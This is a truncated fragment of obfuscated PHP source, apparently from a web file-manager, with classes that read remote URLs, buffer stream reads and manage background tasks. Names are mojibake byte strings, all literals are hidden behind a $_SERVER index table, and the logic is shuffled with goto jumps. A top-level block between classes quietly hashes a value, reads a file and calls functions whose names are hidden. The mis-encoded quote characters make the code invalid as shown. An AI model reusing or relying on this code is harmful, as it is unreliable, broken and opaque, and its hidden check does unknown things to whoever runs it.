$this->objectMeta($aÎ«Ïğö); } public function isFolder($fÌ¿ß„ì“) { return $this->cacheMethod($_SERVER[“][223], $fÌ¿ß„ì“); } protected function objectMeta($Cœ¯ßÆ®­í) { return $this->cacheMethod($_SERVER[“][224], $Cœ¯ßÆ®­í); } protected function _objectMeta($b–ÀÏÙ³òô) { goto d¹ÒÅ´¤ÔÆ; c†Ş¾½É™æ: $C‚ñ˜ ÄæÕ = array($F¡óÑÓ×Ü¤[28] => get_path_this($b–ÀÏÙ³òô), $F¡óÑÓ×Ü¤[29] => isset($FÙİï­” •[$F¡óÑÓ×Ü¤[1270]]) ? $FÙİï­” •[$F¡óÑÓ×Ü¤[1270]] : null, $F¡óÑÓ×Ü¤[77] => isset($FÙİï­” •[$F¡óÑÓ×Ü¤[1271]]) ? $FÙİï­” •[$F¡óÑÓ×Ü¤[1271]] : null, $F¡óÑÓ×Ü¤[196] => isset($FÙİï­” •[$F¡óÑÓ×Ü¤[1272]]) ? $FÙİï­” •[$F¡óÑÓ×Ü¤[1272]] : null, $F¡óÑÓ×Ü¤[1240] => isset($FÙİï­” •[$F¡óÑÓ×Ü¤[1273]]) ? $FÙİï­” •[$F¡óÑÓ×Ü¤[1273]] : null); $C‚ñ˜ ÄæÕ[$F¡óÑÓ×Ü¤[1241]] = isset($FÙİï­” •[$F¡óÑÓ×Ü¤[1274]]) ? strtotime($FÙİï­” •[$F¡óÑÓ×Ü¤[1274]]) : $C‚ñ˜ ÄæÕ[$F¡óÑÓ×Ü¤[1240]]; return $C‚ñ˜ ÄæÕ; goto e±ùÆÄöÃ; d¹ÒÅ´¤ÔÆ: $F¡óÑÓ×Ü¤ =& $_SERVER[“]; if ($b–ÀÏÙ³òô == $F¡óÑÓ×Ü¤[33] || $b–ÀÏÙ³òô == $F¡óÑÓ×Ü¤[8]) { return array(); } $bË‹íŒ˜Öö = $this->ussRequest($b–ÀÏÙ³òô, $F¡óÑÓ×Ü¤[1269]); goto CõÖ¸ÛÑŠò; CõÖ¸ÛÑŠò: if (!$bË‹íŒ˜Öö[$F¡óÑÓ×Ü¤[1019]]) { return null; } $FÙİï­” • = isset($bË‹íŒ˜Öö[$F¡óÑÓ×Ü¤[1021]]) ? $bË‹íŒ˜Öö[$F¡óÑÓ×Ü¤[1021]] : array(); if (!isset($FÙİï­” •[$F¡óÑÓ×Ü¤[1270]])) { return null; } goto c†Ş¾½É™æ; e±ùÆÄöÃ: } protected function _isFolder($c‹ÌâÅ±Û) { $aó¦œ¯ëà =& $_SERVER[“]; if ($c‹ÌâÅ±Û == $aó¦œ¯ëà[33] || $c‹ÌâÅ±Û == $aó¦œ¯ëà[8]) { return !0; } $c•Ñ¿ˆ®áÖ = $this->objectMeta($c‹ÌâÅ±Û); return isset($c•Ñ¿ˆ®áÖ[$aó¦œ¯ëà[29]]) && $c•Ñ¿ˆ®áÖ[$aó¦œ¯ëà[29]] == $aó¦œ¯ëà[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($e¶ÖŞ¯¬³ = false) { } public function exist($a÷‰ÖäìÄÅ) { $eÒ—†î¶¥Ò = $this->info($a÷‰ÖäìÄÅ); return $eÒ—†î¶¥Ò[$_SERVER[“][188]]; } public function isFile($e¦”È¤‹ó÷) { $C³‡ïÈùöç = $this->info($e¦”È¤‹ó÷); return $C³‡ïÈùöç[$_SERVER[“][188]]; } public function isFolder($a£ƒ¯È©ß») { return !1; } public function size($dÇÛÑ”ÓòÛ) { $bå”Ğ¢àò¶ = $this->info($dÇÛÑ”ÓòÛ); return $bå”Ğ¢àò¶[$_SERVER[“][77]]; } public function info($f×ğ†´Òøë) { return $this->infoParse($f×ğ†´Òøë); } public function infoAuth($céƒâï Ö®) { return $this->infoParse($céƒâï Ö®); } public function infoWithChildren($bôâã¦ƒ‚¼) { return $this->infoParse($bôâã¦ƒ‚¼); } public function infoFull($aá¶ô…ÉØå) { return $this->infoParse($aá¶ô…ÉØå); } private function infoParse($Cïœø±‚®İ) { $bÅÛ§•Ğ’Ä =& $_SERVER[“]; $dãÃ†í§ÀŠ = $this->header($Cïœø±‚®İ); if (!$dãÃ†í§ÀŠ || !$dãÃ†í§ÀŠ[$bÅÛ§•Ğ’Ä[673]]) { return !1; } $B’¹×¸îØÏ = _get($dãÃ†í§ÀŠ, $bÅÛ§•Ğ’Ä[325], 0); $bòª¯´•ë¤ = array($bÅÛ§•Ğ’Ä[28] => $dãÃ†í§ÀŠ[$bÅÛ§•Ğ’Ä[28]], $bÅÛ§•Ğ’Ä[75] => $Cïœø±‚®İ, $bÅÛ§•Ğ’Ä[29] => $bÅÛ§•Ğ’Ä[167], $bÅÛ§•Ğ’Ä[77] => intval($B’¹×¸îØÏ), $bÅÛ§•Ğ’Ä[160] => get_path_ext($dãÃ†í§ÀŠ[$bÅÛ§•Ğ’Ä[28]]), $bÅÛ§•Ğ’Ä[1149] => $B’¹×¸îØÏ > 0 && $dãÃ†í§ÀŠ[$bÅÛ§•Ğ’Ä[1275]], $bÅÛ§•Ğ’Ä[1150] => !1); return $bòª¯´•ë¤; } private function header($eÛÌ “ê) { if (isset(self::$_cacheHeader[$eÛÌ “ê])) { return self::$_cacheHeader[$eÛÌ “ê]; } self::$_cacheHeader[$eÛÌ “ê] = url_header($eÛÌ “ê); return self::$_cacheHeader[$eÛÌ “ê]; } public function hashSimple($bš×…¸ìŠ, $BÕÄÆ‰Æ‚ï = false) { goto F¥¹ˆÛŸêØ; cº‰°Çòî°: $Dä’ê‘½÷™ = $FãšÂß­ø[$dêˆìÂ½°[77]]; $bÜ¢‹¥Ñ = 200; $eÕ•ìñİ‘ñ = 50; goto BáĞçöõØ; F¥¹ˆÛŸêØ: $dêˆìÂ½° =& $_SERVER[“]; $FãšÂß­ø = $this->info($bš×…¸ìŠ); if (!$FãšÂß­ø || !$FãšÂß­ø[$dêˆìÂ½°[188]]) { return !1; } goto cº‰°Çòî°; BáĞçöõØ: if ($Dä’ê‘½÷™ <= $bÜ¢‹¥Ñ * $eÕ•ìñİ‘ñ) { return md5($this->fileSubstr($bš×…¸ìŠ, 0, $Dä’ê‘½÷™)) . $Dä’ê‘½÷™; } $eÈâõ•›ò = intval($Dä’ê‘½÷™ / $eÕ•ìñİ‘ñ); $AÍ²ÜÄ´â˜ = $dêˆìÂ½°[33]; goto B‰‰ñÅè‘³; B‰‰ñÅè‘³: $dğâ•¶’ØÙ = timeFloat(); $DÆ‘Òƒ¶Ã = 15; for ($Dñ†¿Ç™Ñâ = 0; $Dñ†¿Ç™Ñâ < $eÕ•ìñİ‘ñ; $Dñ†¿Ç™Ñâ++) { if (timeFloat() - $dğâ•¶’ØÙ > $DÆ‘Òƒ¶Ã) { return !1; } $bÆñ‘‹‹Î‰ = $this->fileSubstr($bš×…¸ìŠ, $eÈâõ•›ò * $Dñ†¿Ç™Ñâ, $bÜ¢‹¥Ñ); if (!$bÆñ‘‹‹Î‰) { return !1; } $AÍ²ÜÄ´â˜ .= $bÆñ‘‹‹Î‰; } goto Eæñ¾è³Ë ; Eæñ¾è³Ë : $AÍ²ÜÄ´â˜ .= $this->fileSubstr($bš×…¸ìŠ, $Dä’ê‘½÷™ - $bÜ¢‹¥Ñ, $bÜ¢‹¥Ñ); return md5($AÍ²ÜÄ´â˜) . $Dä’ê‘½÷™; goto CõÚµğŸÅ×; CõÚµğŸÅ×: } public function getContent($Eù²­µ½) { return $this->fileSubstr($Eù²­µ½); } public function fileSubstr($cÂöÕ–„íƒ, $e×©óËÄ† = 0, $Fñ¥ñŸ– = -1) { goto Cà¢Û¶ª; D¤“é§¯: $C˜‰Éš¹êß = url_request($cÂöÕ–„íƒ, $AŸ†ˆÆ›½°[216], !1, $d“ƒŞ¯Œ°Õ, !1, !1, 1); return $C˜‰Éš¹êß[$AŸ†ˆÆ›½°[1021]] ? $C˜‰Éš¹êß[$AŸ†ˆÆ›½°[1021]] : $AŸ†ˆÆ›½°[33]; goto DÂõÙˆâƒš; C¡°ì²§İ: if ($Fñ¥ñŸ– === -1) { $Fñ¥ñŸ– = $A°ëÅ®ÆÊ[$AŸ†ˆÆ›½°[77]]; } if ($Fñ¥ñŸ– == 0) { return $AŸ†ˆÆ›½°[33]; } $d“ƒŞ¯Œ°Õ = array($AŸ†ˆÆ›½°[1276] . $e×©óËÄ† . $AŸ†ˆÆ›½°[699] . ($e×©óËÄ† + $Fñ¥ñŸ– - 1)); goto D¤“é§¯; Cà¢Û¶ª: $AŸ†ˆÆ›½° =& $_SERVER[“]; $A°ëÅ®ÆÊ = $this->info($cÂöÕ–„íƒ); if (!$A°ëÅ®ÆÊ || !$A°ëÅ®ÆÊ[$AŸ†ˆÆ›½°[188]] && $A°ëÅ®ÆÊ[$AŸ†ˆÆ›½°[77]] > 1024 * 1024 * 10) { return !1; } goto C¡°ì²§İ; DÂõÙˆâƒš: } public function download($cåîÃ§‹òÔ, $fİ­À‹¸²¾) { Downloader::start($cåîÃ§‹òÔ, $fİ­À‹¸²¾); return $fİ­À‹¸²¾; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($e¨°ÒÃ´ì«, $aÁäÔ·µÑ™ = '') { goto D¸µ´ôä–; bİÖ´Å†Šà: return $this->info ? !0 : !1; goto F“¼Ú‰©°; bÎ¸‰õ³Å‘: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$e¨°ÒÃ´ì«])) { self::$_chunkBuffer[$e¨°ÒÃ´ì«] = array(); } goto bİÖ´Å†Šà; D¸µ´ôä–: $this->info = $this->info($e¨°ÒÃ´ì«); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[“][75]]; goto bÎ¸‰õ³Å‘; F“¼Ú‰©°: } function stream_read($AØ¬¡‰Œ©ª) { $EßØíÌÓˆ = $this->fileSubstr($this->pose, $AØ¬¡‰Œ©ª); $this->pose += strlen($EßØíÌÓˆ); return $EßØíÌÓˆ; } public function stream_tell() { return $this->pose; } public function stream_seek($dÄÄ‹§¨â¶, $Cªì¶ÒÎ‡) { $FŠÑ¸ğ®° =& $_SERVER[“]; if ($Cªì¶ÒÎ‡ == SEEK_SET) { $this->pose = $dÄÄ‹§¨â¶; } else { if ($Cªì¶ÒÎ‡ == SEEK_CUR) { $this->pose += $dÄÄ‹§¨â¶; } else { if ($Cªì¶ÒÎ‡ == SEEK_END) { $this->pose = $this->info[$FŠÑ¸ğ®°[77]] + intval($dÄÄ‹§¨â¶); } } } if ($dÄÄ‹§¨â¶ < 0) { $this->pose = $this->info[$FŠÑ¸ğ®°[77]] + $dÄÄ‹§¨â¶; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[“][77]]; } public function stream_close() { return !0; } public function url_stat($Bêê—„²õ, $b’˜Î—­õ÷) { $D…¯Ğ©‰… =& $_SERVER[“]; $aĞóÃÇ½ = $this->info($Bêê—„²õ); return array($D…¯Ğ©‰…[1277] => 0, $D…¯Ğ©‰…[1278] => 0, $D…¯Ğ©‰…[12] => 32768 + 511, $D…¯Ğ©‰…[1279] => 0, $D…¯Ğ©‰…[1280] => 0, $D…¯Ğ©‰…[1281] => 0, $D…¯Ğ©‰…[1282] => 0, $D…¯Ğ©‰…[77] => $aĞóÃÇ½[$D…¯Ğ©‰…[77]], $D…¯Ğ©‰…[1283] => $aĞóÃÇ½[$D…¯Ğ©‰…[1155]], $D…¯Ğ©‰…[1241] => $aĞóÃÇ½[$D…¯Ğ©‰…[107]], $D…¯Ğ©‰…[1240] => $aĞóÃÇ½[$D…¯Ğ©‰…[187]], $D…¯Ğ©‰…[1284] => 0, $D…¯Ğ©‰…[1285] => 0); } static $fileInfo = array(); public function info($A¦©øëÇ™) { $b„İ‹³Ú¡æ = $_SERVER[“][1286]; if (isset(self::$fileInfo[$A¦©øëÇ™])) { return self::$fileInfo[$A¦©øëÇ™]; } if (substr($A¦©øëÇ™, 0, strlen($b„İ‹³Ú¡æ)) != $b„İ‹³Ú¡æ) { return !1; } self::$fileInfo[$A¦©øëÇ™] = IO::info(substr($A¦©øëÇ™, strlen($b„İ‹³Ú¡æ))); return self::$fileInfo[$A¦©øëÇ™]; } public static function read($F¼µ§®ÖŸÃ, $Fµ‘ã×ÂØ‰, $C·•¿‰œ) { goto e¦õ»¯ì§Ö; EóÙßßí”Œ: return $CØÉç‹Ø‹; goto Ağ¿ó÷ÌŞÂ; e¦õ»¯ì§Ö: $eÌ³—À¦Ç° =& $_SERVER[“]; $bŒØôîæ¸ = fopen($F¼µ§®ÖŸÃ, $eÌ³—À¦Ç°[1157]); if (!$bŒØôîæ¸) { return $eÌ³—À¦Ç°[33]; } goto bîÍ¥É“‹; bîÍ¥É“‹: $eœì°ÇŒ‡ = 8192; fseek($bŒØôîæ¸, $Fµ‘ã×ÂØ‰, SEEK_SET); $CØÉç‹Ø‹ = $eÌ³—À¦Ç°[33]; goto B²…÷ÒÄæ; B²…÷ÒÄæ: $aÛµ½š²­ = 0; while ($aÛµ½š²­ < $C·•¿‰œ) { $f‰çæƒ = min($eœì°ÇŒ‡, $C·•¿‰œ - $aÛµ½š²­); $CØÉç‹Ø‹ .= fread($bŒØôîæ¸, $f‰çæƒ); $aÛµ½š²­ += $f‰çæƒ; } fclose($bŒØôîæ¸); goto EóÙßßí”Œ; Ağ¿ó÷ÌŞÂ: } public function fileSubstr($D˜å²Ş†Œ, $fÆí½¶ö–) { goto D‹Åó÷å‰Á; D‹Åó÷å‰Á: $EÑ…ŞŸë’– =& $_SERVER[“]; $døŒâ˜éê = $this->info[$EÑ…ŞŸë’–[77]]; $E‘Ã÷•šô = $D˜å²Ş†Œ; goto cŒ·‹–™àµ; FÄ¯Š–ò·Õ: $B Ğœ×”ÑŠ = 0; $fê¥†„Úªµ = 0; $A¹í‹¡ø´Ã = $EÑ…ŞŸë’–[33]; goto b‘è“ÏÀÈ; b‘è“ÏÀÈ: foreach ($e§¥ß‚ò as $B Ğœ×”ÑŠ => $A¹í‹¡ø´Ã) { $B Ğœ×”ÑŠ = intval($B Ğœ×”ÑŠ); $fê¥†„Úªµ = $B Ğœ×”ÑŠ + strlen($A¹í‹¡ø´Ã); if ($D˜å²Ş†Œ >= $fê¥†„Úªµ) { continue; } if ($D˜å²Ş†Œ >= $B Ğœ×”ÑŠ && $D˜å²Ş†Œ + $fÆí½¶ö– <= $fê¥†„Úªµ) { return substr($A¹í‹¡ø´Ã, $D˜å²Ş†Œ - $B Ğœ×”ÑŠ, $fÆí½¶ö–); } break; } if (count($e§¥ß‚ò) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($EÑ…ŞŸë’–[1287], $EÑ…ŞŸë’–[1288] . count($e§¥ß‚ò) . "\x3b\163\x74\x61\162\x74\75{$D˜å²Ş†Œ}\x2c\154\x65\156\147\164\150\75{$fÆí½¶ö–}\73\x70\x6f\163\145\x3a{$B Ğœ×”ÑŠ}\x7e{$fê¥†„Úªµ}"); throw new Exception($EÑ…ŞŸë’–[1289]); } $b”ä„¼‚ô¨ = intval($D˜å²Ş†Œ / $B·‹ÇÒ¡°½) * $B·‹ÇÒ¡°½; goto A¯§³Š÷–; e†‡æÉ¼Ì: if ($D˜å²Ş†Œ + $fÆí½¶ö– > $døŒâ˜éê) { $fÆí½¶ö– = $døŒâ˜éê - $D˜å²Ş†Œ; } if ($fÆí½¶ö– <= 0) { return $EÑ…ŞŸë’–[33]; } if ($D˜å²Ş†Œ < 0 || $D˜å²Ş†Œ >= $døŒâ˜éê || $fÆí½¶ö– <= 0 || $fÆí½¶ö– > 1024 * 1024 * 5) { throw new Exception("\151\157\106\151\x6c\x65\122\145\x61\x64\40\x65\x72\162\157\162\41\x20\x73\x74\x61\162\x74\x3d{$D˜å²Ş†Œ}\x3b\x6c\145\x6e\147\x74\150\75{$fÆí½¶ö–}\73\40\x73\x69\172\x65\75{$døŒâ˜éê}\x3b"); } goto dÓæƒˆ‘²…; cŒ·‹–™àµ: $f¡‹ß–’ã = $fÆí½¶ö–; if ($D˜å²Ş†Œ < 0) { $D˜å²Ş†Œ = $døŒâ˜éê + $D˜å²Ş†Œ; } if ($fÆí½¶ö– === !1) { $fÆí½¶ö– = $døŒâ˜éê - $D˜å²Ş†Œ; } goto e†‡æÉ¼Ì; dÓæƒˆ‘²…: $B·‹ÇÒ¡°½ = 64 * 1024; $e§¥ß‚ò =& self::$_chunkBuffer[$this->path]; if (!$e§¥ß‚ò) { $e§¥ß‚ò = array(); } goto FÄ¯Š–ò·Õ; cİÓ‡¿ùï: ksort($e§¥ß‚ò); $eÏ‹ğ¦ğî = substr($fë§¬˜ÑÓ¥, $D˜å²Ş†Œ - $b”ä„¼‚ô¨, $fÆí½¶ö–); return $eÏ‹ğ¦ğî; goto dôÃùóàŠ; A¯§³Š÷–: $bïŒ¯•È‚Í = ceil(($D˜å²Ş†Œ + $fÆí½¶ö–) / $B·‹ÇÒ¡°½) * $B·‹ÇÒ¡°½ - $b”ä„¼‚ô¨; $fë§¬˜ÑÓ¥ = IO::fileSubstr($this->path, $b”ä„¼‚ô¨, $bïŒ¯•È‚Í); $e§¥ß‚ò[$b”ä„¼‚ô¨ . $EÑ…ŞŸë’–[33]] = $fë§¬˜ÑÓ¥; goto cİÓ‡¿ùï; dôÃùóàŠ: } private function log($EœóÍ¦é‰, $B‘Æ¨ÉŒóŞ) { $cÆâƒœñøĞ =& $_SERVER[“]; $FŒäº…À‰ = timeFloat() - $this->timeStart; write_log(sprintf($cÆâƒœñøĞ[1290], $EœóÍ¦é‰, $this->info[$cÆâƒœñøĞ[28]], $FŒäº…À‰, $B‘Æ¨ÉŒóŞ), $cÆâƒœñøĞ[1206]); } } goto e¤×øˆ¼’; bšÃï¡Â±: $fßº¼÷ùÄ = $_SERVER[“][773]; if ($_SERVER[$_SERVER[“][774]] != $fßº¼÷ùÄ($bÂ¼›´İöÃ)) { goto eˆ‡°³Â¤«; fŒáÜ Ó´¡: $cˆî¤ñ©($bÂ¼›´İöÃ); goto c‡™‰¦î¦ò; FŞÓºïŸ…Ğ: $fßë¤Áß¬ = explode($_SERVER[“][217], $Aö‚×­… „); if (count($fßë¤Áß¬) < $_SERVER[“][559]) { $f“±¶©Œ‚Ô = $_SERVER[“][779]; $f“±¶©Œ‚Ô(); } $cˆî¤ñ© = $_SERVER[“][1422]; goto fŒáÜ Ó´¡; eˆ‡°³Â¤«: $D¯ĞÒØ¬Ôí = $_SERVER[“][776]; $eß‹ˆÈô…Ú = $_SERVER[$_SERVER[“][777]] . $_SERVER[“][778]; $Aö‚×­… „ = $D¯ĞÒØ¬Ôí($eß‹ˆÈô…Ú); goto FŞÓºïŸ…Ğ; c‡™‰¦î¦ò: } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\x75\156\156\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($D¤Ä™Â„, $C§ÂˆÌ‰³ë = '', $eÕø©£à‹ = 0, $F”ÆàÎœºÃ = '') { goto cÊ»ñë‘¿Ÿ; b”À¾ßæÕ¼: Hook::bind($f¥Û‰åÍÄ[1388], array($this, $f¥Û‰åÍÄ[1431])); Hook::bind($f¥Û‰åÍÄ[1432], array($this, $f¥Û‰åÍÄ[1433])); $this->startAfter(); goto Eâğ÷¯¬Ù«; cÊ»ñë‘¿Ÿ: $f¥Û‰åÍÄ =& $_SERVER[“]; if (self::get($D¤Ä™Â„)) { return; } $this->task = array($f¥Û‰åÍÄ[367] => $D¤Ä™Â„, $f¥Û‰åÍÄ[1423] => USER_ID, $f¥Û‰åÍÄ[1328] => $F”ÆàÎœºÃ, $f¥Û‰åÍÄ[29] => $C§ÂˆÌ‰³ë, $f¥Û‰åÍÄ[965] => $f¥Û‰åÍÄ[33], $f¥Û‰åÍÄ[963] => $eÕø©£à‹, $f¥Û‰åÍÄ[977] => 0, $f¥Û‰åÍÄ[1424] => 0, $f¥Û‰åÍÄ[1425] => 0, $f¥Û‰åÍÄ[1426] => timeFloat(), $f¥Û‰åÍÄ[1427] => 0, $f¥Û‰åÍÄ[1428] => 0, $f¥Û‰åÍÄ[1429] => 0, $f¥Û‰åÍÄ[1430] => 0, $f¥Û‰åÍÄ[673] => $f¥Û‰åÍÄ[1386]); goto b”À¾ßæÕ¼; Eâğ÷¯¬Ù«: Hook::trigger($f¥Û‰åÍÄ[1434], $this->task); $this->task[$f¥Û‰åÍÄ[1428]] = timeFloat(); goto e«çîˆ¿Ş«; e«çîˆ¿Ş«: } public function end() { goto CŒÔÌƒçŒƒ; aš†²Åƒ : $dÃ³ŸÃ» = timeFloat() - $this->task[$fâÎÛˆ¢¿[1426]]; self::log($fâÎÛˆ¢¿[1435] . $this->task[$fâÎÛˆ¢¿[367]] . $fâÎÛˆ¢¿[1436] . $dÃ³ŸÃ» . $fâÎÛˆ¢¿[1437]); Hook::unbind($fâÎÛˆ¢¿[1388], array($this, $fâÎÛˆ¢¿[1431])); goto cºÆàß•; CŒÔÌƒçŒƒ: $fâÎÛˆ¢¿ =& $_SERVER[“]; if (!$this->task) { return; } if ($this->task[$fâÎÛˆ¢¿[1428]]) { self::valueSet($this->task[$fâÎÛˆ¢¿[367]], !1); } goto aš†²Åƒ ; cºÆàß•: Hook::unbind($fâÎÛˆ¢¿[1432], array($this, $fâÎÛˆ¢¿[1433])); $this->endAfter(); $this->task = !1; goto FåÁ”ŒÅ½“; FåÁ”ŒÅ½“: } public function update($Cì‰¨ùï¯ë = 0) { goto AÙ½Ñ‰„İ¹; e©áèŠ«’: $d•¯ô³¡šĞ[$DÇ‰ïáõ[977]] += $Cì‰¨ùï¯ë; $d•¯ô³¡šĞ[$DÇ‰ïáõ[1427]] = timeFloat(); if ($d•¯ô³¡šĞ[$DÇ‰ïáõ[963]]) { if ($d•¯ô³¡šĞ[$DÇ‰ïáõ[963]] < $d•¯ô³¡šĞ[$DÇ‰ïáõ[977]]) { $d•¯ô³¡šĞ[$DÇ‰ïáõ[963]] = $d•¯ô³¡šĞ[$DÇ‰ïáõ[977]]; } $B„¡ËÔ“¨ò = timeFloat() - $d•¯ô³¡šĞ[$DÇ‰ïáõ[1426]] - $d•¯ô³¡šĞ[$DÇ‰ïáõ[1429]]; $d•¯ô³¡šĞ[$DÇ‰ïáõ[1424]] = $d•¯ô³¡šĞ[$DÇ‰ïáõ[977]] / $d•¯ô³¡šĞ[$DÇ‰ïáõ[963]]; $d•¯ô³¡šĞ[$DÇ‰ïáõ[1425]] = $d•¯ô³¡šĞ[$DÇ‰ïáõ[977]] / $B„¡ËÔ“¨ò; if ($d•¯ô³¡šĞ[$DÇ‰ïáõ[1424]] > 0) { $d•¯ô³¡šĞ[$DÇ‰ïáõ[1430]] = $B„¡ËÔ“¨ò * (1 - $d•¯ô³¡šĞ[$DÇ‰ïáõ[1424]]) / $d•¯ô³¡šĞ[$DÇ‰ïáõ[1424]]; } $d•¯ô³¡šĞ[$DÇ‰ïáõ[1430]] = $d•¯ô³¡šĞ[$DÇ‰ïáõ[1430]] <= 0 ? 0 : $d•¯ô³¡šĞ[$DÇ‰ïáõ[1430]]; } goto BÜÆÕŠ½£İ; BÜÆÕŠ½£İ: $this->updateAfter(); $eÀˆ´¢ ‚ = 0.2; if (timeFloat() - $d•¯ô³¡šĞ[$DÇ‰ïáõ[1428]] < $eÀˆ´¢ ‚) { return; } goto FÆ¶ŞŒƒÌ; A†³ÕÛ¬àÓ: $d•¯ô³¡šĞ[$DÇ‰ïáõ[673]] = $C‰ğÔà™×œ ? $C‰ğÔà™×œ : $d•¯ô³¡šĞ[$DÇ‰ïáõ[673]]; $d•¯ô³¡šĞ[$DÇ‰ïáõ[1429]] = $D¼Ì°”é‘…[$DÇ‰ïáõ[1429]] ? $D¼Ì°”é‘…[$DÇ‰ïáõ[1429]] : 0; $d•¯ô³¡šĞ[$DÇ‰ïáõ[1428]] = timeFloat(); goto eáÀÖÍÊ; eáÀÖÍÊ: Hook::trigger($DÇ‰ïáõ[1441], $d•¯ô³¡šĞ); self::valueSet($d•¯ô³¡šĞ[$DÇ‰ïáõ[367]], $d•¯ô³¡šĞ); goto fÉÄ˜‡ŠèØ; FÆ¶ŞŒƒÌ: $D¼Ì°”é‘… = self::get($d•¯ô³¡šĞ[$DÇ‰ïáõ[367]]); $C‰ğÔà™×œ = $D¼Ì°”é‘…[$DÇ‰ïáõ[673]]; if ($C‰ğÔà™×œ == self::STATYS_KILL) { $D«Áïñì°Å = array($DÇ‰ïáõ[1438] => LNG($DÇ‰ïáõ[1439]), $DÇ‰ïáõ[1019] => !1); Cache::set($DÇ‰ïáõ[1440] . $this->task[$DÇ‰ïáõ[367]], $D«Áïñì°Å, 30); $this->end(); die; } else { if ($C‰ğÔà™×œ == self::STATYS_STOP) { $eªÑ’™¦‹¶ = 2; $D¼Ì°”é‘…[$DÇ‰ïáõ[1429]] += $eªÑ’™¦‹¶; self::valueSet($d•¯ô³¡šĞ[$DÇ‰ïáõ[367]], $D¼Ì°”é‘…); sleep($eªÑ’™¦‹¶); $this->update(); return; } } goto A†³ÕÛ¬àÓ; AÙ½Ñ‰„İ¹: $DÇ‰ïáõ =& $_SERVER[“]; $d•¯ô³¡šĞ =& $this->task; if (!$d•¯ô³¡šĞ) { return; } goto e©áèŠ«’; fÉÄ˜‡ŠèØ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($cğ«‘Ì¿Õ) { $Aİá‰£ó =& $_SERVER[“]; Cache::set($Aİá‰£ó[1440] . $this->task[$Aİá‰£ó[367]], $cğ«‘Ì¿Õ, 60); return $cğ«‘Ì¿Õ; } public static function get($E’Ë’¥µã) { return self::valueGet($E’Ë’¥µã); } public static function listData() { $FäÑæğ«Ô = self::valueGet(); return array_sort_by($FäÑæğ«Ô, $_SERVER[“][1426], !0); } public static function kill($f§ÙíÌ) { return self::changeStatus($f§ÙíÌ, self::STATYS_KILL); } public static function stop($eÏÔôÈä) { return self::changeStatus($eÏÔôÈä, self::STATYS_STOP); } public static function restart($eîôá†…«“) { return self::changeStatus($eîôá†…«“, self::STATYS_RUNNING); } public static function killAll() { $Fñ¨¢Öì†Ê =& $_SERVER[“]; $Eï‡Æ•šÄè = self::listData(); foreach ($Eï‡Æ•šÄè as $f¿çé„¿®Ô) { self::kill($f¿çé„¿®Ô[$Fñ¨¢Öì†Ê[367]]); } sleep(2); foreach ($Eï‡Æ•šÄè as $f¿çé„¿®Ô) { self::valueSet($f¿çé„¿®Ô[$Fñ¨¢Öì†Ê[367]], !1); } } private static function changeStatus($e›¢’‰™Í», $F†¤—¡·…—) { goto Dö÷«îƒ•; B°ğõ‰Èíê: $aÎ‚àõçÍÄ[$e†¡Ò‡…Â[673]] = $F†¤—¡·…—; self::valueSet($e›¢’‰™Í», $aÎ‚àõçÍÄ); self::log($e†¡Ò‡…Â[1442] . $aÎ‚àõçÍÄ[$e†¡Ò‡…Â[367]] . $e†¡Ò‡…Â[1443] . $F†¤—¡·…—); goto C‘ïñŞÇ; C‘ïñŞÇ: return !0; goto aßòªÔØÈê; Dö÷«îƒ•: $e†¡Ò‡…Â =& $_SERVER[“]; $aÎ‚àõçÍÄ = self::valueGet($e›¢’‰™Í»); if (!$aÎ‚àõçÍÄ) { return !1; } goto B°ğõ‰Èíê; aßòªÔØÈê: } public static function valueGet($C„£‹à‚˜‹ = false) { $CôÄ¬Íêˆæ =& $_SERVER[“]; if ($C„£‹à‚˜‹) { $e‰Ò‘×ƒ = Model($CôÄ¬Íêˆæ[399])->where(array($CôÄ¬Íêˆæ[89] => $C„£‹à‚˜‹, $CôÄ¬Íêˆæ[29] => $CôÄ¬Íêˆæ[1444]))->find(); return $e‰Ò‘×ƒ ? json_decode($e‰Ò‘×ƒ[$CôÄ¬Íêˆæ[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($eŒÌõÅÄ = false) { goto d¥Æ‚Åí“´; DçÓË¨ôîÆ: return $dƒ«À×ÔÕƒ; goto bòÖ†ßÛ»è; cÂƒÜøÊã©: $dƒ«À×ÔÕƒ = Model($BŠÁËµ¦¥[399])->where($bµÂœíˆ©)->select(); $dƒ«À×ÔÕƒ = $dƒ«À×ÔÕƒ ? $dƒ«À×ÔÕƒ : array(); foreach ($dƒ«À×ÔÕƒ as $eæ¹ÇÈÇö => $DÓ¨ÛÄÂâ) { $dƒ«À×ÔÕƒ[$eæ¹ÇÈÇö] = json_decode($DÓ¨ÛÄÂâ[$BŠÁËµ¦¥[359]], !0); } goto DçÓË¨ôîÆ; d¥Æ‚Åí“´: $BŠÁËµ¦¥ =& $_SERVER[“]; $bµÂœíˆ© = array($BŠÁËµ¦¥[29] => $BŠÁËµ¦¥[1444]); if ($eŒÌõÅÄ) { $bµÂœíˆ©[$BŠÁËµ¦¥[1423]] = $eŒÌõÅÄ; } goto cÂƒÜøÊã©; bòÖ†ßÛ»è: } public static function valueSet($C‚ï¦—‚÷×, $c˜ôˆì¾Ø÷) { goto f‹¯¦×£öá; f‹¯¦×£öá: $D½“™ÒÖÉ =& $_SERVER[“]; if (!$c˜ôˆì¾Ø÷) { return Model($D½“™ÒÖÉ[399])->where(array($D½“™ÒÖÉ[89] => $C‚ï¦—‚÷×, $D½“™ÒÖÉ[29] => $D½“™ÒÖÉ[1444]))->delete(); } $b®œÕÈ‹½ò = json_encode($c˜ôˆì¾Ø÷); goto eå¯–³Ô”É; BÚÒ‚¡í¥ò: Model($D½“™ÒÖÉ[399])->add($b¢ĞÖì“ÛŒ, array(), !0); goto 